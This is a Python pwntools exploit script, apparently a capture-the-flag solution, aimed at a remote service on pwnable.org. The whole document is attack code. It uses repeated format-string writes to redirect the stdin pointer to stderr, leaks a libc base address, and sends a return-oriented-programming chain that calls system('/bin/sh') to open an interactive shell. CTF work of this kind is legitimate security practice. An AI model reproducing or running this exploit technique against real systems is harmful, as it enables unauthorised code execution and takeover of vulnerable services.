from pwn import *

while True:
	while True:
		#r = process(["/bin/bash", "-c", "./patched 2>/dev/null"])
		#r = process("./patched")
		r = remote("pwnable.org", 12020)

		r.recvuntil("name: ")
		r.sendline("%107x%39$hhn")
		r.recvuntil("phone: ")
		r.sendline(str(0x123))
		r.recvuntil("yourself!")


		offset = cyclic(0x100).index("accaacdaaceaacfaac")
		payload = "A"*0x5
		r.sendline(payload)
		r.recvuntil(payload)
		r.sendline("~.")

		try:
			print(r.recvuntil("name: ", timeout=3))
			break
		except:
			print("fail")
			r.close()
			continue
	cur = 219
	for i in range(5):
		print(i)
		r.sendline("%{}x%39$hhn".format(str(cur).zfill(3)))
		r.recvuntil("phone: ")
		r.sendline(str(0x123))
		r.recvuntil("yourself!")

		offset = cyclic(0x100).index("accaacdaaceaacfaac")
		payload = "A"*0x5
		r.sendline(payload)
		r.sendline("~.")
		cur += 0x70
		cur &= 0xff
	cur += (0x100-0x18)
	cur &= 0xff

	r.sendline("%{}x%39$hhn".format(str(cur).zfill(3)))
	r.recvuntil("phone: ")
	r.sendline(str(0x123))
	r.recvuntil("yourself!")
#r.interactive()

	offset = cyclic(0x100).index("accaacdaaceaacfaac")
	payload = "A"*0x5
	r.sendline(payload)
	r.sendline("~.")


	cur += -0x18 + 0x70 + 0x10
	cur &= 0xff

	r.sendline("%{}x%39$hhn%0200c%65$hhn".format(str(cur).zfill(3)))
	r.recvuntil("phone: ")
	r.sendline(str(0x123))
	r.recvuntil("yourself!")

	offset = cyclic(0x100).index("accaacdaaceaacfaac")
	payload = "A"*0x5
	r.sendline(payload)
	r.sendline("~.")
	cur = (cur + 0x70) & 0xff

# fuck stdin pointer to stderr lol
	r.sendline("%{}x%39$hhn%50712c%115$hn".format(str(cur).zfill(3)))
	r.recvuntil("phone: ")
	r.sendline(str(0x123))
	r.recvuntil("yourself!")

	offset = cyclic(0x100).index("accaacdaaceaacfaac")
	payload = "A"*0x5
	r.sendline(payload)
	r.sendline("~.")
	cur = (cur + 0x70) & 0xff

	print("WINWIN") # clobber to 0x1
	r.sendline("%{}x%39$hhn%185c%115$hhn".format(str(cur).zfill(3)))
	r.recvuntil("phone: ")
	r.sendline(str(0x123))
	r.recvuntil("yourself!")

	offset = cyclic(0x100).index("accaacdaaceaacfaac")
	payload = "A"*0x5
	r.sendline(payload)
	r.sendline("~.")
	cur = (cur + 0x70) & 0xff

	cur = (cur + 0x70) & 0xff
	r.sendline("%{}x%39$hhnCCCC%48$pBBBB".format(str(cur).zfill(3)))
	r.recvuntil("phone: ")
	r.sendline(str(0x123))
	a = ""
	try:
		a += r.recvuntil("CCCC", timeout=3)
	except:
		print("fail leak")
		r.close()
		continue
	if "CCCC" in a:
		print("siced leak")
	else:
		print("fail leak")
		r.close()
		continue
	leak = int(r.recvuntil("BBBB")[:-4], 16) - 0x21b97
	print(hex(leak))
	r.recvuntil("yourself!")

	offset = cyclic(0x100).index("accaacdaaceaacfaac")
	payload = "A"*0xe0 + p64(leak + 0x000000000002155f) + p64(leak + 0x1b3e9a) + p64(leak + 0x4f440)
	r.sendline(payload)
	r.sendline("~.")
	cur = (cur + 0x70) & 0xff
	print("GET FLAG SICE")

	r.interactive()
	exit()

